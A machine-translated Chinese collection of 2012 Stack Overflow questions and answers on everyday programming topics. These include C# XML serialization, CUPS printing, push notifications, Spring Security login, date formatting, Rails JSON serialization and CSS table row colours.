> 时间：2012-05-30T07:11:58.980
> 
> 标签：c#, .net, xml, serialization, xml-serialization

我有这堂课：

```
[XmlRoot("menuItem")]
public class MenuItem
{
    [XmlAttribute("text")]
    public string Text { get; set; }

    [XmlAttribute("isLink")]
    public bool IsLink { get; set; }

    [XmlAttribute("url")]
    public string Url { get; set; }

    [XmlArray("items", IsNullable = true)]
    public List<MenuItem> Items { get; set; }
} 
```

它定义了一个菜单层次结构。现在，在序列化此类时，3 级菜单的输出 XML 是：

```
<menuItem xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
text="Tools" isLink="false">
  <items>
    <MenuItem text="Market" isLink="false">
      <items>
        <MenuItem text="Market Analyzer" isLink="true" url="/tools/market/analyzer">
          <items xsi:nil="true" />
        </MenuItem>
      </items>
    </MenuItem>
    <MenuItem text="Banking" isLink="false">
      <items>
        <MenuItem text="Purchase" isLink="true" url="/buy?type=good">
          <items xsi:nil="true" />
        </MenuItem>
      </items>
    </MenuItem>
    <MenuItem text="General" isLink="false">
      <items>
        <MenuItem text="Forecasts" isLink="true" url="/wheather-forcasts?city=la">
          <items xsi:nil="true" />
        </MenuItem>
      </items>
    </MenuItem>
  </items>
</menuItem> 
```

所以，`MenuItem`是**root**和**child-element**。作为根，它被序列化为`menuItem`适当的大小写。但是，作为子元素，它的大小写是不正确的。如何使序列化程序创建`menuItem`而不是`MenuItem`在子项的输出中。区分大小写在这里对我很重要。

我试图将`[XmlElement]`属性放在类本身上，但出现以下错误：

> 属性“XmlArrayItem”在此声明类型上无效。它仅对“属性、索引器、字段、参数、返回”声明有效。

此外，我不希望那里有那些默认命名空间，也不希望将子项创建为空元素。最终的 XML 文件应该像这个 XML 示例一样干净：

```
<menuItem text='Tools' isLink='false'>
  <items>
    <menuItem text='Market' isLink='false'>
      <items>
        <menuItem text='Market Analyzer' isLink='true' url='/tools/market/analyzer' />
      </items>
    </menuItem>
    <menuItem text='Banking' isLink='false'>
      <items>
        <menuItem text='Purchase' isLink='true' url='/buy?type=good' />
      </items>
    </menuItem>
    <menuItem text='General' isLink='false'>
      <items>
        <menuItem text='Forecasts' isLink='true' url='/wheather-forcasts?city=la' />
      </items>
    </menuItem>
  </items>
</menuItem> 
```

我应该使用什么属性？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:18:03.310

添加`XmlArrayItemAttribute`和删​​除 IsNullable：

```
[XmlArray("items"), XmlArrayItem("menuItem")]
public List<MenuItem> Items { get; set; } 
```

要摆脱额外的命名空间，您需要使用`XmlSerializerNamespaces`：

```
var ns = new XmlSerializerNamespaces();
ns.Add("","");
var ser = new XmlSerializer(typeof (MenuItem));
ser.Serialize(Console.Out, obj, ns); 
```

# macos - Mac “打印失败，因为 PMSessionBeginCGDocumentNoDialog() 返回 -30870。”

> ID：10811583
> 
> 赞同：1
> 
> 时间：2012-05-30T07:12:04.183
> 
> 标签：macos, printing

几个月来，这个错误一直困扰着我：

> 打印失败，因为 PMSessionBeginCGDocumentNoDialog() 返回 -30870。

打印（甚至使用打印对话框）时，有时会弹出一个警告对话框，提示打印失败，并将上述错误记录到控制台。没有进一步的诊断信息被记录。这让我在一个每隔几秒就产生打印作业的专用应用程序感到悲痛，有点像 RIP。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:12:04.323

*注意：我正在回答我自己的问题-<a href="https://blog.stackoverflow.com/2011/07/its-ok-to-ask-and-answer-your-own-questions/">显然这个没关系。*

对于一系列 CUPS 问题，这似乎是一个相当通用的错误代码。

就我而言，这是因为队列中有太多打印作业，CUPS 不再接受。如果这是您的问题，请增加您的[MaxJobs](http://www.cups.org/doc-1.1/sam.html#MaxJobs)值或将其设置为`0`.

# android - Whatsapp、Viber 等应用程序如何跟踪移动用户？

> ID：10811586
> 
> 赞同：9
> 
> 时间：2012-05-30T07:12:19.063
> 
> 标签：android, ios

我的意思是他们是否使用乒乓消息来获取用户连接信息？简而言之，他们如何知道将要来的请求发送到哪里？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-30T07:53:18.157

对于**iOS**，这些应用程序使用 APNS（Apple 推送通知服务）。

这是 Apple 提供的一项服务，可帮助应用程序在发生某些事情时提醒用户。

简而言之（和简化），它的工作原理是这样的

*   安装应用程序时，系统会询问用户是否应允许该应用程序向手机发送推送消息。

*   如果用户接受，应用程序将注册到 APNS 服务器（由 Apple 托管）并注册“设备令牌”。此令牌是一个序列号，可帮助 Apple 服务器跟踪手机。

*   该应用程序连接到应用程序服务器（例如 Viber 的服务器）并将设备令牌也发送到此服务器。服务器会将其连接到特定用户。

*   当用户接到电话时，viber 服务器会联系 APNS 服务器，进而提醒用户。

*   APNS 服务器跟踪用户在他/她的手机上拥有的所有应用程序。它将处理所有通知。iPhone 和 APNS 服务器之间的连接是内置于 iOS 平台的，并且会定期自动进行。

*   当 viber 服务器告知 APNS 服务器特定设备令牌正在发生某些事情时，APNS 服务器将联系该特定电话并向电话发送消息。在这种情况下，用户将被告知他/她有来自 viber 的来电。

可以在此处找到 APNS 的文档： [本地和推送通知编程指南](http://developer.apple.com/library/mac/#documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/ApplePushService/ApplePushService.html)

说到**Android**，有一个等效的服务，[C2DM](https://developers.google.com/android/c2dm/) 我猜这些应用程序在使用此服务的 Android 上以类似的方式工作。

如果您在开始使用 Push 时需要一点帮助，有一项名为[Urban Airship](http://urbanairship.com/)的很棒的服务可以让事情变得更容易，它同时支持 iOS、Android 和其他平台。

编辑：在应用程序已经打开的情况下，连接可以使用套接字连接保持打开状态，或者可以通过轮询刷新内容。这取决于应用程序的时间紧迫性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:21:02.670

在此类应用程序中，用户是基于 Android 设备唯一 ID 进行跟踪的。

```
import android.provider.Settings.Secure;

private String android_id = Secure.getString(getContext().getContentResolver(),
                                                    Secure.ANDROID_ID); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:25:26.520

这些应用程序都连接到提供商的服务器并保持连接打开。因此服务器能够判断客户端是否已连接。从此，就只是正常的网络通信：

1.  客户端 #1 将消息连同目标信息一起发送到服务器
2.  服务器向目标客户端发送新消息可用的通知
3.  客户端 #2 在收到通知后从服务器检索消息

# objective-c - Objective - utf-8 中的 C、NSDictionary 编码

> ID：10811594
> 
> 赞同：2
> 
> 时间：2012-05-30T07:13:14.527
> 
> 标签：objective-c, encoding, utf-8, nsdictionary, special-characters

我有 NSDictionary，我从 .plist 中读取的内容以 utf-8 编码。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ABACİ</key>
    <array>
        <string>ABALİ</string>
        <string>APACİ</string>
        <string>ARAÇİ</string>
    </array> 
```

等等

无论如何，问题是当我将这本字典上的内容 NSLog 到控制台时，我得到的结果如下

```
"K\U00d6PEK" 
```

这是另一个不包含常规拉丁英文字符的条目的记录版本。我尝试使用的字符采用 UTF-8 编码。

但是，当我从文本文件中读取数组的内容时

```
NSString *filePath = [[NSBundle mainBundle] pathForResource:@"words_tr" ofType:@"txt"];
        NSString *contentString = [[NSString alloc] initWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:NULL];

        _wordStack = [[NSMutableArray alloc]initWithArray:[contentString componentsSeparatedByString:@","]]; 
```

这完美地工作。我也想从属性列表中读取数据。如何获取 NSDictionary 的 UTF-8 编码结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:17:36.117

你试过用这个来 NSLog 吗？

```
NSLog(@"%@", [NSString stringWithCString:contentString encoding:NSUTF8StringEncoding]); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-18T10:37:02.603

```
+(NSString*)utf8toNString:(NSString*)str{
    NSString* strT= [str stringByReplacingOccurrencesOfString:@"\\U" withString:@"\\u"];
    //NSString *strT = [strTemp mutableCopy];
    CFStringRef transform = CFSTR("Any-Hex/Java");
    CFStringTransform((__bridge CFMutableStringRef)strT, NULL, transform, YES);

    return strT;
} 
```

# xml - 如何在 Xpath 中将 xml 字符串提供给 XDocument

> ID：10811596
> 
> 赞同：0
> 
> 时间：2012-05-30T07:13:39.983
> 
> 标签：xml, c#-4.0, xpath

我在字符串中有xml文件。我没有权利在磁盘上写。如何将此字符串传递给 XPathDocument？

XPathDocument Doc = new XPathDocument(xmlFile);

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:16:01.107

使用 XDocument 代替 XPathDocument 更容易：

```
XDocument doc = XDocument.Parse(s); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:16:56.480

您应该能够通过将字符串转换为流，然后使用[XPathDocument(Stream) 构造函数](http://msdn.microsoft.com/en-us/library/system.xml.xpath.xpathdocument.aspx)来完成此操作：

```
string xmlFile;  // TODO get string
byte[] byteArray = Encoding.ASCII.GetBytes( xmlFile );
MemoryStream stream = new MemoryStream( byteArray );
var Doc = new XPathDocument( stream ); 
```

# c# - 根据数据库选择突出显示/禁用 ajax 日历控件中的特定日期

> ID：10811598
> 
> 赞同：2
> 
> 时间：2012-05-30T07:13:43.123
> 
> 标签：c#, asp.net-ajax, calendar, ajaxcontroltoolkit

我需要使用 ajax 日历控件来显示当前日期的日期并禁用和突出显示存储在数据库表中的日期。

我可以禁用以前的日期并将选择限制为从当前日期开始的一个月，并且还可以突出显示在 asp.net 日历控件中已经为事件预订的日期，但在 ajax 日历控件中没有。

![在此处输入图像描述](../Images/ca169f8cbd417becf23f117c4081d160.png)

以下代码在 ajaxcalander 控件中生成错误：

```
 protected void AjaxCalendar_PreRender(object sender, EventArgs e)  
   {
        //startdate= enddate="2012-06-25"
        DateTime startDate = Helper.GetUAEDateTime();
        DateTime endDate = DateTime.Now.AddDays(10);

        AjaxCalendar.StartDate = startDate;
        AjaxCalendar.EndDate = endDate;

        // If the month is CurrentMonth
        if (!e.Day.IsOtherMonth)
        {
            foreach (DataRow dr in ds.Tables[0].Rows)
            {
                if ((dr["BookingDate"].ToString() != DBNull.Value.ToString()))
                {
                    DateTime dtEvent = (DateTime)dr["BookingDate"];
                    if (dtEvent.Equals(e.Day.Date))
                    {
                        e.Cell.BackColor = Color.PaleVioletRed;
                        e.Day.IsSelectable = false;

                    }
                }
            }
        }
        //If the month is not CurrentMonth then hide the Dates
        else
        {
            e.Cell.Text = "";
        }
    }
} 
```

**错误由以下代码生成** `if (!e.Day.IsOtherMonth)`

> CS1061：“System.EventArgs”不包含“Day”的定义，并且找不到接受“System.EventArgs”类型的第一个参数的扩展方法“Day”（您是否缺少 using 指令或程序集引用？）

HTML

```
<asp:TextBox ID="TextBox2" runat="server"></asp:TextBox>
<asp:CalendarExtender ID="AjaxCalendar" runat="server"  
     TargetControlID="TextBox2" Format="yyyy-MM-dd" 
     onprerender="AjaxCalendar_PreRender"  >
</asp:CalendarExtender> 
```

如果我将相同的代码块放在 asp.net 日历控件中，它工作正常

我花了几个小时寻找可以帮助我解决此问题的解决方案或代码示例，但没有成功。我将不胜感激这方面的任何帮助。

我查看了 100 个示例，但其中大多数显示阻止旧日期或周末使用 javascript，但我想使用后面的代码来实现它。ajax 日历控件中可用的一天渲染事件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T06:49:44.510

```
<AjaxControl:CalendarExtender ID ="myCalendar" runat=”server” TargetControlID=”txtDateTime” OnClientShown="disablenonthursdays">
</AjaxControl:CalendarExtender>

<script language="javascript">
function disablenonthursdays(sender, args)
{
     for(var day =0; day <sender._days.all.length; day++)
    {
              for(var weekday =0; weekday < 6; weekday++)
             {
                    if(sender._days.all[day].id != “calendarValidToDate_day_”+ weekday +”_4″)
                   {
                          sender._days.all[day].disabled = true;
                          sender._days.all[day].innerHTML = “&lt;div>” +sender._days.all[day].innerText+ “&lt;/div>”;
                    }
            }
     }
}
</script> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-30T07:40:31.950

这是正确的，因为 e 属于 EventArgs 类型，女巫包含有关事件的信息。我不知道 PreRender-Event 中的实际类型，但您应该能够调试代码并且需要将 e 转换为实际类型才能访问属性“Day”。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-19T14:43:07.367

我认为您可以使用`Calandar control`and来做到这一点`PopupControl Extender`。你可以做你所做的一切`Calendar control`，它的行为就像`Calendar Extender`。也检查[这个链接](http://walikata.blogspot.com/2012/07/calendar-control-date-disable.html)。

# python - easy_install 是否提供搜索命令？

> ID：10811601
> 
> 赞同：5
> 
> 时间：2012-05-30T07:14:04.500
> 
> 标签：python, easy-install, package-managers

有时我需要猜测包名，是否有任何包搜索工具，例如 apt/yum/port/brew 中的搜索命令...

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-30T07:16:48.067

不，但您可以在[PyPi](http://pypi.python.org/pypi)上在线搜索，这是 easy_install、pip 等人使用的数据库。

# asp.net-mvc-3 - 是否有任何不需要 HTTP 上下文的 MVC 电子邮件包？

> ID：10811604
> 
> 赞同：11
> 
> 时间：2012-05-30T07:14:27.970
> 
> 标签：asp.net-mvc-3, razor, actionmailer, html-email, mvcmailer

我们从我们的 ASP.NET MVC 3 Razor Web 应用程序发送电子邮件。

目前我们正在使用 ActionMailer.NET。

我看过 MvcMailer。

两者的问题是它们需要一个 Http Context 来执行。

这个问题是我想异步发送电子邮件。现在我知道您可以异步执行实际发送（例如 SMTP 调用），但我希望发送电子邮件的整个过程是异步的，例如：

```
public ActionResult DoSomething(Something something)
{
   _db.Save(something);

   Task.Factory.StartNew(() => {
      new MailController().DoSomething().Send(something);
   });

   return RedirectToAction("Index");
} 
```

在“DoSomething”方法中，我再次查询数据库，做其他事情等等......我希望所有这些都是异步的 - 因此整个调用都包含在一个任务中，而不是仅仅做`.SendAsync()`. 希望这是有道理的。

上面的例子是 ActionMailer，它中断了——因为 HTTP 上下文在生成的线程中消失了。

有谁知道我怎样才能让它工作，或者另一个不依赖 HTTP 上下文存在的包？

我不确定为什么需要 HTTP 上下文 - 这里没有请求路由，只是将文件系统上的视图解析为 HTML。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T04:26:30.997

ActionMailer.NET 现在可以在 MVC 之外独立使用。

此处介绍了详细信息

[http://geeksharp.com/2011/07/06/actionmailer-0-6-released/](http://geeksharp.com/2011/07/06/actionmailer-0-6-released/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:24:18.607

您可以签出使用[RazorViewEngine](http://aboutcode.net/postal/)的邮件：

```
public class HomeController : Controller
{
    public ActionResult Index()
    {
        Task.Factory.StartNew(() =>
        {
            Thread.Sleep(5000);
            dynamic email = new Email("Example");
            email.To = "webninja@example.com";
            email.FunnyLink = "some funny link";
            email.Send();
        });

        return View();
    }
} 
```

和里面`~/Views/Emails/Example.cshtml`：

```
To: @ViewBag.To
From: lolcats@website.com
Subject: Important Message

Hello,
You wanted important web links right?
Check out this: @ViewBag.FunnyLink 
```

在将应用程序投入生产之前，还要确保您已阅读并理解[在 ASP.NET 应用程序中实现后台任务的危险。](http://haacked.com/archive/2011/10/16/the-dangers-of-implementing-recurring-background-tasks-in-asp-net.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-07T22:32:19.893

如果您使用的是 .NET 4.5（或任何 Async CTP），您可能需要查看[async ActionMethods](http://www.asp.net/mvc/tutorials/mvc-4/using-asynchronous-methods-in-aspnet-mvc-4)。坦率地说，我不确定要求是什么（MVC 3/4），但那篇文章应该会有所帮助。

我也不确定您为什么如此担心数据库查找所花费的时间——它真的做了那么多吗？

**比 SendAsync 更好的解决方案：** 我更喜欢不使用 SendAsync，而是使用常规的 Send 方法[通过 SMTP 服务器](http://fmuntean.wordpress.com/2008/10/26/how-to-configure-iis-smtp-server-to-forward-emails-using-a-gmail-account/)发送，例如我正在使用的 IIS 中的那个（注意：您必须使用 IIS6 控制台，即使您正在使用 IIS7 来管理您的主 IIS）。一旦您的本地计算机将电子邮件排队并且您无需等待它被发送，这将立即返回。也许更重要的是，如果发送错误，它将继续为您重试。信不信由你——有时 smtp.gmail.com 没有响应。

# iphone - 将资源添加到 iPhone 中的静态库

> ID：10811609
> 
> 赞同：1
> 
> 时间：2012-05-30T07:14:53.063
> 
> 标签：iphone, xcode, image, plist, static-libraries

我要创建一个静态库，但是在向其中添加图像和 plist 时遇到了问题。

有没有办法做到这一点？我发现了一些像[这样](https://stackoverflow.com/questions/1808673/how-to-include-resources-in-iphone-static-library)的链接，但它对我没有帮助，因为无法理解它。

请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-21T02:29:26.653

[如果您首先为您的库创建一个cocoapod](http://cocoapods.org/)并在您的 .podspec 中使用它，您可以包含非传统库资源，如图像或plist：

`s.resources = 'LibraryName/**/*.{png,plist,xib,and,so,on}'`

然后，使用您的 cocoapod 的客户端项目将包含您的资源。

# php - PHP - 将日期插入数据库会导致错误的日期格式？

> ID：10811613
> 
> 赞同：-2
> 
> 时间：2012-05-30T07:15:10.450
> 
> 标签：php, database, date

我将此查询表示为一个字符串（它被缩短以使其更易于阅读）：

```
$query = 'INSERT INTO mytable (ke_voucher_date) VALUES (\'%s\')'; 
```

现在这就是我接下来要做的：

```
$query = vsprintf($query, array_map('mysql_real_escape_string', $params));
mysql_query($query); 
```

$params 是一个包含所有应该保存的值的数组，在这种情况下（因为它被缩短了）只有格式为 dd.mm.yyyy (21.04.2012) 的日期。例如，结果是 21.04.2026。代码有什么问题，想法？也许是%s？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:19:40.563

“21.04.2012”不是 MySQL 喜欢的格式。您应该始终将日期格式设置为`Y-m-d`，例如`2012-04-21`。

> 尽管 MySQL 尝试以多种格式解释值，但日期部分必须始终按年-月-日顺序给出（例如，'98-09-04'），而不是按月-日-年或日-月-其他地方常用的年份顺序（例如，'09-04-98'、'04-09-98'）。

# java - Spring Security：以编程方式登录

> ID：10811623
> 
> 赞同：8
> 
> 时间：2012-05-30T07:15:32.327
> 
> 标签：java, spring, mobile, spring-security

我们正在使用 jQuery mobile 开发一个移动应用程序，并希望在使用 spring 安全性正确设置的 spring 3.1.x 后端上以编程方式对用户进行身份验证。

包含用户名和密码的 POST 请求被发送到后端（使用 jQuery 的 $.post），然后服务器验证凭据是否正确并登录用户。

服务器似乎在 SecurityContext 中正确设置了身份验证，但是当我们向服务器发出第二个请求（一个 $.get 到需要登录的页面）时，似乎没有记住安全细节并且似乎是匿名令牌在上下文中。

这是控制器中处理登录的方法（为简洁起见，删除了密码检查）：

```
@RequestMapping(value = "/login", method = RequestMethod.POST, produces = "application/json")
@ResponseBody
public Map<String, String> login(@RequestParam String username, @RequestParam String password, HttpServletRequest request) {
    Map<String, String> response = new HashMap<String, String>();

    User u = userService.findByAccountName(username);

    if (u != null && u.hasRole("inspector")) {
        UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(username, password);
        try {
            Authentication auth = authenticationManager.authenticate(token);
            SecurityContextHolder.getContext().setAuthentication(auth);

            response.put("status", "true");
            return response;
        } catch (BadCredentialsException ex) {
            response.put("status", "false");
            response.put("error", "Bad credentials");
            return response;
        }
    } else {
        response.put("status", "false");
        response.put("error", "Invalid role");
        return response;
    }
} 
```

这是我们从上下文中获取用户详细信息的另一种方法：

```
@RequestMapping(value = "/project", method = RequestMethod.GET)
@ResponseBody
public String getProjects(HttpSession session) {

    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
    User u = userService.findByAccountName(((UserDetails) authentication.getPrincipal()).getUsername());
... 
```

弹簧安全配置：

```
<global-method-security pre-post-annotations="enabled"/>
<http use-expressions="true" auto-config="true">

    <form-login login-processing-url="/static/j_spring_security_check" login-page="/"
                authentication-failure-url="/?login_error=t"/>

    ...
    <intercept-url pattern="/api/**" access="permitAll"/>
    ...
    <remember-me key="biKey" token-validity-seconds="2419200"/>
    <logout logout-url="/logout"/>
</http>

<authentication-manager alias="authenticationManager">
    <authentication-provider user-service-ref="udm">
        <password-encoder hash="md5"/>
    </authentication-provider>
</authentication-manager> 
```

这应该根据 spring 安全文档和其他在线资源工作。关于什么可能是错误的任何想法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-05T15:35:04.420

我对你的配置感到困惑。您已经实现了自己的登录控制器，但您似乎正在使用 Spring Security 的表单登录。我最近使用 Spring Security + jquery 实现了 ajax 登录。我没有编写自己的控制器，而是简单地实现了自己的 AuthenticationSuccessHandler 和 AuthenticationFailureHandler 来返回我需要的 json 响应。只需扩展 SimpleUrlAuthenticationSuccessHandler 和 SimpleUrlAuthenticationFailureHandler 覆盖每个类中的 onAuthenticationSuccess 和 onAuthenticationFailure 方法，就像......

```
public void onAuthenticationSuccess(HttpServletRequest request,
        HttpServletResponse response, Authentication authentication)
        throws IOException, ServletException {
    response.getWriter().println("{\"success\": true}");
}

public void onAuthenticationFailure(HttpServletRequest request,
        HttpServletResponse response, AuthenticationException exception)
        throws IOException, ServletException {
    response.getWriter().println("{\"success\": false}");
} 
```

然后您可以使用类似...的内容配置表单登录元素

```
<form-login login-processing-url="/static/j_spring_security_check" login-page="/"
            authentication-success-handler-ref="ajaxAuthenticationSuccessHandler"
            authentication-failure-handler-ref="ajaxAuthenticationFailureHandler"
            authentication-failure-url="/?login_error=t"/> 
```

# iphone - 在iphone中格式化时日期错误？

> ID：10811627
> 
> 赞同：0
> 
> 时间：2012-05-30T07:15:38.087
> 
> 标签：iphone, objective-c, xcode, nsdate, nsdateformatter

嗨，我正在尝试格式化从服务器获取的日期。我试过这样

```
NSString *dateStr =@"2012-5-21";
    // Convert string to date object
    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
    [dateFormat setDateFormat:@"yyyy-mm-dd"];
    NSDate *date = [dateFormat dateFromString:dateStr];

    // Convert date object to desired output format
    [dateFormat setDateFormat:@"dd MMM yyyy"];
                                dateStr = [dateFormat stringFromDate:date];  
    finalDate.text=dateStr;

    [dateFormat release]; 
```

但代替`21 May 2012`. 我正进入（状态`21 Jan 2012`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T07:22:28.067

您第一次使用错误的格式。mm 是 Minutes ，用大写 MM 替换它 -

```
[dateFormat setDateFormat:@"yyyy-MM-dd"]; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T07:18:30.773

使用 Capital MM 表示月份格式

```
 [dateFormat setDateFormat:@"yyyy-MM-dd"]; 
```

# ruby-on-rails - Rails 3.2：用 json 序列化中的空字符串替换空值

> ID：10811628
> 
> 赞同：3
> 
> 时间：2012-05-30T07:15:40.313
> 
> 标签：ruby-on-rails, ruby, json, serialization, ruby-on-rails-3.2

我正在使用 Rails 3.2[序列化](http://www.simonecarletti.com/blog/2010/04/inside-ruby-on-rails-serializing-ruby-objects-with-json/)将 ruby​​ 对象转换为 json。

例如，我已将 ruby​​ 对象序列化为以下 json

```
{
  "relationship":{
    "type":"relationship",
    "id":null,
    "followed_id": null
  }
} 
```

在我的类关系中使用以下序列化方法 < [ActiveRecord::Base](http://api.rubyonrails.org/classes/ActiveRecord/Base.html)

```
def as_json(opts = {})
  {
   :type        => 'relationship',
   :id          => id,
   :followed_id => followed_id
  }
end 
```

我需要用空字符串替换空值，即空双引号，以响应 json。

我怎样才能做到这一点？

最好的祝福，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:23:06.983

我没有看到这里的问题。只需通过`||`运算符即可：

```
def as_json(opts = {})
  {
   :type        => 'relationship',
   :id          => id || '',
   :followed_id => followed_id || ''
  }
end 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T11:43:21.910

可能不是最好的解决方案，但受到这个[答案的启发](https://stackoverflow.com/a/10813910/285614)

```
def as_json(opts={})
  json = super(opts)
  Hash[*json.map{|k, v| [k, v || ""]}.flatten]
end 
```

- 编辑 -

根据 jdoe 的评论，如果您只想在 json 响应中包含一些字段，我更喜欢这样做：

```
def as_json(opts={})
  opts.reverse_merge!(:only => [:type, :id, :followed_id])
  json = super(opts)
  Hash[*json.map{|k, v| [k, v || ""]}.flatten]
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-17T06:19:00.990

使用以下方法，您将获得修改后的哈希或 json 对象。它将用 nill 替换空白字符串。需要在参数中传递哈希值。

```
def json_without_null(json_object)
  if json_object.kind_of?(Hash)
    json_object.as_json.each do |k, v|
      if v.nil?
        json_object[k] = ""
      elsif  v.kind_of?(Hash)
        json_object[k] = json_without_null(v)
      elsif v.kind_of?(Array)
        json_object[k] = v.collect{|a|  json_without_null(a)}
      end
    end
  end
  json_object
end 
```

# html - 各行的 CSS 背景颜色

> ID：10811634
> 
> 赞同：5
> 
> 时间：2012-05-30T07:16:03.850
> 
> 标签：html, css, asp.net-mvc

我在网上找到了很多关于为交替表行着色的文章。如果我想为各个行使用不同的颜色，我该怎么做？

![在此处输入图像描述](../Images/b998060f6e1633a4b11184185fb66ca4.png)

```
<table class="table1">          
<tr>
   <th>Name</th>
   <th>Surname</th>
   <th>Email</th>
</tr>                
 @{ foreach (var p in Model.People)
     {   <tr>
             <td>@p.Name</td>
             <td>@p.Surname</td>
             <td>@p.Number</d>
         </tr>
     } 
  }
</table> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:24:28.070

你可以在你的CSS

```
.table1 tr:nth-child(1) {    background:blue;           }
.table1 tr:nth-child(2) {    background:red;            }
.table1 tr:nth-child(3) {    background:orange;         }
...
​ 
```

见演示 [http://jsfiddle.net/wnCgL/](http://jsfiddle.net/wnCgL/)

**编辑**

使用 jQuery，使用[随机颜色函数](https://stackoverflow.com/a/1484514/529725)

```
$(function() {
     $('.table1').find('tr').each(
        function() {
          $(this).css('background', get_random_color());  
        });
}); 
```

[http://jsfiddle.net/wnCgL/1/](http://jsfiddle.net/wnCgL/1/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:27:13.583

比如像这样。定义一些枚举，或者您以后可以随机生成颜色：

```
public enum Colors
{
    Blue = 1,
    Red = 2,
    Yellow = 3,
    Pink = 4,
    Green = 5,
} 
```

然后在标记文件中从枚举中获取随机颜色

```
@{ foreach (var p in Model.People)
     {   <tr style="background-color:@(Colors[new Random().Next(0,Colors.Length)])">
             <td>@p.Name</td>
             <td>@p.Surname</td>
             <td>@p.Number</d>
         </tr>
     } 
} 
```

**更新：或者，如果您想让用户使用**[奇数和偶数](http://www.w3.org/Style/Examples/007/evenodd.en.html)css 样式 使其更具可读性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T07:33:48.243

检查这个小提琴 - [http://jsfiddle.net/r74j6/6/](http://jsfiddle.net/r74j6/6/)

或者这篇文章 -[使用 jquery 应用不同的背景颜色](https://stackoverflow.com/questions/3905145/apply-different-background-color-using-jquery)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:35:04.027

我宁愿填充 td 的背景色：

```
.table1 tr:nth-child(1) td { background-color: red }
.table1 tr:nth-child(2) td { background-color: green }
.table1 tr:nth-child(3) td { background-color: blue } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-30T07:28:13.673

您可以使用 css 选择器`:nth-child`，但请检查它的[兼容性](http://reference.sitepoint.com/css/pseudoclass-nthchild#compatibilitysection)。

```
tbody tr:nth-child(1) { background-color: #ffc000; } 
```

示例：http: [//jsfiddle.net/SK4dV/](http://jsfiddle.net/SK4dV/)

对于 IE8 及以下版本，您可以通过 JavaScript 添加样式属性或类，或者在生成表格时为每一行添加类并为其添加一些 css 规则。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-30T07:28:30.177

那么基本上你有2个选择。

1)**模型属性**- 将类作为每个人的模型属性，这样您就可以将不同的属性分配给不同的人。

2)**纯 CSS** - 如果你想要 CSS 路由，只需为不同的选择器指定不同的颜色。

就个人而言，我会选择 2 号。以下是示例：

**不同的行颜色 -[演示](http://jsfiddle.net/8exEZ/)**

对于每个项目的不同行颜色，您必须执行以下操作：

```
tr:nth-child(2)
{
    background-color: red;
}
tr:nth-child(3)
{
    background-color: blue;
}
tr:nth-child(4)
{
    background-color: green;
}
tr:nth-child(5)
{
    background-color: yellow;
}
tr:nth-child(6)
{
    background-color: orange;
}
tr:nth-child(7)
{
    background-color: purple;
} 
```

**交替行 -[演示](http://jsfiddle.net/8exEZ/1/)**

对于交替行，只需执行以下操作：

```
tr:not(:nth-child(1)):nth-child(odd) /* excluding first row (header) */
{
    background-color: blue;
}
tr:nth-child(even)
{
    background-color: red;
} 
```

# python - 从摆动表中的 AbstractCellEditor / Combobox 派生

> ID：10811635
> 
> 赞同：0
> 
> 时间：2012-05-30T07:16:07.863
> 
> 标签：python, swing, jython

我正在尝试将组合框作为编辑器添加到 jython 中的表列中。由于我想根据我试图实现的行来选择值`AbstractCellEditor`来设置自定义编辑器，所以我的代码大约是：

```
from javax.swing.table import TableCellEditor
from javax.swing import AbstractCellEditor

class customCombo(TableCellEditor):

    def __init__(self):
        self._box = JComboBox( editable = False );
        #button.setActionCommand(EDIT);
        #self._box.actionListener = self.actionPerformed

    def actionPerformed(self, event):
        print "well we should do something"

    def getCellEditorValue(self):
        return self._box.selectedItem

    def getTableCellEditorComponent(self, table, value, isSelected, row, col):
        #TODO: customize the dropdown
        self._box.removeAll()
        self._box.add("head") #should this be addItem
        return self._box

 class table(object):
       def __init__(self):
           ...
           self._table.columnModel.getColumn(8).cellEditor = customCombo() 
```

